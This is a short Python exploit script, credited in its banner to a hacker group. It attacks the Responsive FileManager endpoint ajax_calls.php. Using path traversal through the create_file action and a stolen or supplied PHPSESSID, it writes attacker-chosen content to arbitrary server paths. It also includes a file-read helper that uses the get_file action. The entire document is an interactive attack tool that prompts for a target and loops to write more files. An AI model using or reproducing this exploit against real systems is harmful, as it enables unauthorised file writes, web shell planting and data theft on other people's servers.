#!/usr/bin/python
import requests

def file_read(root,target, session, file):
	ajax = "/assets/filemanager/filemanager/ajax_calls.php"
	#root = "../../../../../../../../"
	path   = {'path':root+file}
	cookie = {'PHPSESSID':session}
	url    = "http://"+target+ajax+"?action=get_file&sub_action=edit&preview_mode=text"
	r  	   = requests.post(url, cookies=cookie, data=path)
	print(r.text)

def exploit_rfm(root,target,ajax,session):
	#root = "../../../../../../../../"
	fileread   = input("File Path >> ")
	filename   = input("File Name >> ")
	content    = input("Content   >> ")
	path   = {'paths[0]':root+fileread, 'names[0]':filename,'new_content':content}
	cookie = {'PHPSESSID':session}
	url    = "http://"+target+ajax+"?action=create_file"
	r  	   = requests.post(url, cookies=cookie, data=path)
	print(r.text)
	#print ("Result : ")
	#file_read(root, target, session, fileread+filename)
	exploit_rfm(root, target, ajax, session)

print("""################## | Coded by FilthyRoot
# RFM File Write # | Github : Sora Cyber Team
################## | Copyright (c) 2019 Jogjakarta Hacker Link""")

target 	  = input("Target 	  : ")
ajax_call = input("Execute   : ")
session	  = input("PHPSESSID : ")
root 	  = input("Root 	 : ")

exploit_rfm(root,target,ajax_call,session)